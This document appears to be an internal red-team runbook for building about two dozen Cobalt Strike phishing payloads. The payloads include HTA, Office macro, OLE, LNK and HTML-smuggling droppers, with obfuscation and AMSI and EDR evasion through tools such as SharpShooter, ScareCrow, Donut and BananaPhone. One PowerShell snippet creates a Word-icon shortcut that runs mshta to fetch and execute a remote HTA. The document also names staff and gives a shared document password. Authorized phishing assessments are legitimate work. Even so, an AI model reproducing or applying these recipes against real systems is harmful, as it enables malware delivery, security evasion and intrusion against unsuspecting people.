## **__Payloads__**

* Some gov leads will do all of the phishing stuff themselves but others will want you to make and test the payloads
  * Self-sufficient: Blake Rubach
  * Hands-off: Kyle Evers (says he’s working on automating the whole process)
* You’ll probably have to adjust the firewall when testing payloads, make sure you re-add the DENY statements at the end of the day

Make the following payloads and then using the html phishing template in the Appendix.

After you verify the payload is working host the payload files on Cobalt Strike

* Attacks
* Web Drive-By
* Host File
* Use the following settings
  1. Local URI: /filename
  2. Local Host: 127.0.0.1
  3. Local Port: 443
  4. SSL: Enable SSL checked

### __01-dns-vba.hta__

* Attacks
* Packages
* HTML Application

| Field | Option |
|----|----|
| Listener | DNS |
| Method | VBA |

* Name Payload `01-dns-vba.hta`

### **__02-dns-tiki.hta__**

* Attacks
* Packages
* Payload Generator

| Field | Option |
|----|----|
| Listener | DNS |
| Output | Raw |
| 64 Bit | Unchecked |

* Name Payload `02-dns-tiki.bin`
* Base64 encode the shell `cat 02-dns-tiki.bin | base64 -w 0`
* Paste shellcode into tiki_blank template (located in `/share/tmp` or check the Appendix) where it asks for input and then save as `02-dns-tiki.hta`

### **__03-dns-macro-pw.docm__**

* Attacks
* Packages
* MS Office Macro

| Field | Option |
|----|----|
| Listener | DNS |

* Copy Macro and paste into Macro section of word document (Follow Cobalt Strike Instructions if Lost)
* Password Protect and name: `03-dns-macro-pw.docm` password: `dhstest`

### **__04-https-psh.hta__**

* Attacks
* Packages
* HTML Application

| Field | Option |
|----|----|
| Listener | HTTPS |
| Method | Powershell |

* Save as: `04-https-psh.hta`
* Edit the file and change `powershell` to `powershell.exe`

### **__05-https-psh-morph.hta__**

* Ensure `powershell` has been changed to `powershell.exe` within `04-https-psh.hta`
* Morph the hta to something obfuscated using the following command:

  ```bash
  cd /tools/morphHTA/;python2.7 morph-hta.py --in ~/Working/Payloads/04-https-psh.hta --out ~/Working/Payloads/05-https-psh-morph.hta --maxvarlen 4 --maxstrlen 4
  ```
* Note: I keep generating until I get an all lowercase "**null**" value and payload file size is roughly **200k** bytes, but as long as it calls back to teamserver, that is all that matters.

### **__06-https-sharp.hta__**

* Attacks
* Packages
* Payload Generator

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | C# |
| 64 Bit | Unchecked |

* Name Payload `06-https.cs`
* Edit 06-https.cs and remove everything before the first hex value (ie: "0xfc") and after the last hex value (ie: "0x94")
* Keep generating and testing the HTA until it works and you get a callback with the following command:

  ```bash
  cd /tools/SharpShooter; python SharpShooter.py --dotnetver 2 --delivery web --payload hta --shellcode --scfile ~/Working/Payloads/06-https.cs --smuggle --template sharepoint --web https://<URL>/06-https-sharp.payload --output 06-https-sharp
  ```
  1. When generating the payload you have to use the URL/Domain and not IP address
  2. Host the 06-https-sharp.payload file on the Cobalt Strike server
* If you get an error related to jsmin setup a python virtual environment and then install the requirements and try the command again.

  ```bash
  virtualenv -p python2.7 venv
  source venv/bin/activate
  cd /tools/SharpShooter
  pip install -r requirements.txt
  ```
  * When you’re finished with the virtual environment enter the command **deactivate**

### **__07-https-sharp-amsi.html__**

* Attacks
* Packages
* Windows Executable (S)

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | RAW |
| 64 Bit | Unchecked |

* Name Payload `07-https-sharp-amsi.bin`
* Run the following:

  ```bash
  cd /tools/SharpShooter; python SharpShooter.py --stageless --dotnetver 4 --payload hta --output 07-https-sharp-amsi --rawscfile /path/to/07-https-sharp-amsi.bin --smuggle --template mcafee --amsi amsienable
  ```
* If you get an error related to jsmin setup a python virtual environment and then install the requirements and try the command again.

  ```bash
  virtualenv -p python2.7 venv
  source venv/bin/activate
  cd /tools/SharpShooter
  pip install -r requirements.txt
  ```
  * When you’re finished with the virtual environment enter the command **deactivate**

### **__08-https-exe.hta__**

* Attacks
* Packages
* HTML Application

| Field | Option |
|----|----|
| Listener | HTTPS |
| Method | Executable |

* Save as: `08-https-exe.hta`

### **__09-https-vba.hta__**

* Attacks
* Packages
* HTML Application

| Field | Option |
|----|----|
| Listener | HTTPS |
| Method | VBA |

* Save as: `09-https-vba.hta`

### **__10-https-cactus.hta__**

* Copy the CACTUSTORCH.hta file from /tools/CACTUSTORCH into your working directory (also in the Appendix)
* Attacks
* Packages
* Payload Generator

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | RAW |
| 64 Bit | Unchecked |

* Name the file `cactus.bin` **DO NOT USE 64 BIT**
* Base64 encode the bin file:

  ```bash
  cat cactus.bin | base64 -w 0
  ```
* Edit CACTUSTORCH.hta and replace the line that begins with:

  ```bash
  Dim  code : code ="[PLACE 32 BIT ENCODED BINARY HERE"
  ```
* Rename the file to `10-https-cactus.hta`

### **__11-https-tiki.hta__**

* Attacks
* Packages
* Payload Generator

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | Raw |
| 64 Bit | Unchecked |

* Name Payload `11-https-tiki.bin`
* Base64 encode the shell `cat 11-https-tiki.bin | base64 -w 0`
* Paste shellcode into tiki_blank template (located in /shar/tmp or check the Appendix) where it asks for input and then save as an hta

### **__12-https.exe__**

* Attacks
* Packages
* Windows Executable

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | Windows EXE |
| x64 | Unchecked |

* Save as: `12-https.exe`

### **__13-https-macro.docm__**

* Attacks
* Packages
* MS Office Macro

| Field | Option |
|----|----|
| Listener | HTTPS |

* Copy Macro and paste into Macro section of word document (Follow Cobalt Strike Instructions if Lost)
* Save as: `13-https-macro.docm`

### **__14-https-macro-pw.doc__**

* Save your last payload as a new .doc named `14-https-macro-pw.doc`
* Apply Password Protection: `dhstest`

### **__15-https-ole.docx__**

* Create Blank Word Document named `15-https-ole.docx`
  1. Insert
  2. Object
  3. Object
  4. Create From File
  5. Browse
  6. `12-https.exe`
* Pretty it up with an icon:
  1. Display as Icon Checkbox
  2. Change Icon
  3. Browse
  4. `C:\Program Files (x86)\Microsoft Office\Office15\WINWORD.exe`
  5. Ok
  6. Ok

### **__16-https-ole-pw.docx__**

* Save a copy of the document as `16-https-ole-pw.docx`
* Apply Password Protection: `dhstest`

### **__17-https-tiki-redirect.html__**

* Make a copy of your `11-https-tiki.hta` named `17-https-tiki-redirect.hta`
* copy `17-https-tiki-redirect.html` from /share/tmp (or the Appendix) to your payloads directory
* Modify `17-https-tiki-redirect.html` and change the first two website entries so they match your Cobalt Strike server
* Upload both `17-https-tiki-redirect.hta` and `17-https-tiki-redirect.html` to the Cobalt Strike server

### **__18-https-macro-pw-redirect.html__**

* Make a copy of your `14-https-macro-pw.docm` named `18-https-macro-pw-redirect.docm`
* copy `18-https-macro-pw-redirect.html` from /share/tmp (or the Appendix) to your payloads directory
* Modify `18-https-macro-pw-redirect.html` and change the first two website entries so they match your Cobalt Strike server
* Upload both `18-https-macro-pw-redirect.docm` and `18-https-macro-pw-redirect.html` to the Cobalt Strike server

### **__19-https-velvet-sweatshop.xlsm__**

* Attacks
* Packages
* MS Office Macro

| Field | Option |
|----|----|
| Listener | HTTPS |

* Copy Macro and paste into Macro section of Excel document (Follow Cobalt Strike Instructions if Lost)
* Save as: `19-https-velvet-sweatshop.xlsm`
* Apply Password Protection: `VelvetSweatshop`

### **__20-https-scarecrow.html__**

* Make sure osslsigncode is installed (apt-get install osslsigncode)
* Generate a raw 64 bit bin file in Cobalt Strike
  1. Attacks
  2. Packages
  3. Windows Executable (S)

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | RAW |
| x64 | Checked |

* Save as: `payload64.bin`
* Run the following command:

  ```bash
  ./ScareCrow -I /share/payloadstmp/payload64.bin -domain <DOMAIN>
  ```
  1. the domain can be anything (amazon.com, acme.com, etc.)
  2. <https://github.com/optiv/ScareCrow>
* Embed the script in HTML

  ```bash
  python2.7 embedinHTML.py -f Powerpnt.exe -o 20-https-scarecrow.html -k randomkeygoeshere
  ```
  1. <https://github.com/Arno0x/EmbedInHTML>
* Host HTML file on Cobalt Strike

### **__21-https-banaphone.exe__**

* Generate a raw 64 bit bin file in Cobalt Strike
  1. Attacks
  2. Packages
  3. Windows Executable (S)

| Field | Option |
|----|----|
| Listener | HTTPS |
| Output | RAW |
| x64 | Checked |

* Save as: `payload64.bin`
* Create a Windows binary file with ScareCrow

  ```bash
  ./ScareCrow -I payload64.bin -Loader binary -domain acme.com
  ```
* Convert the binary into 64 bit PIC shellcode with Donut

  ```bash
  ./donut -a 2 -f 7 -o donut_payload.bin cmd.exe
  ```
* Open the newly created .bin file with sublime text editor.
* Copy the byte array into the main.go file in the following directory: BananaPhone/example/hideexample/banana
* In the same directory run the following command to build the banana.exe file

  ```bash
  env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui
  ```
  * Lately this hasn’t been working on Linux, everything builds fine but the you won’t get beacons. If you build the exe using go on a windows machine it should work.
* Change name of banana.exe to 21-https-bananaphone.exe and upload it to Cobalt Strike

### __22-https-lnk.docm__

* Host your 04-https-psh.hta payload on Cobalt Strike
* Update the domain in the following ps1 script and then run it to create the LNK file

  ```bash
  $obj = New-object -comobject wscript.shell
  $link = $obj.createshortcut("22-https.lnk")
  $link.windowstyle = "7"
  $link.targetpath = "cmd.exe"
  $link.iconlocation = "C:\Program Files (x86)\Microsoft Office\Office15\WINWORD.exe"
  $link.arguments = "/c mshta.exe https://cotilah.com:443/04-https-psh.hta"
  $link.save()
  ```
* Once the above PowerShell script is executed, an `.LNK` shortcut is created

### __23-dns-velvet-sweatshop.xlsm__

* Attacks
* Packages
* MS Office Macro

| Field | Option |
|----|----|
| Listener | DNS |

* Copy Macro and paste into Macro section of Excel document (Follow Cobalt Strike Instructions if Lost)
* Save as: `23-dns-velvet-sweatshop.xlsm`
* Apply Password Protection: `VelvetSweatshop`

### __24-dns-scarecrow.html__

* Make sure osslsigncode is installed (apt-get install osslsigncode)
* Generate a raw x64 bin file in Cobalt Strike
  1. Attacks
  2. Packages
  3. Windows Executable (S)

| Field | Option |
|----|----|
| Listener | DNS |
| Output | RAW |
| x64 | Checked |

* Save as: `payload64.bin`
* Run the following command:

  ```bash
  ./ScareCrow -I /share/payloadstmp/payload64.bin -domain <DOMAIN>
  ```
  1. <https://github.com/optiv/ScareCrow>
* Embed the script in HTML

  ```bash
  python embedinHTML.py -f Powerpnt.exe -o 24-dns-scarecrow.html -k randomkeygoeshere
  ```
  1. <https://github.com/Arno0x/EmbedInHTML>
* Host HTML file on Cobalt Strike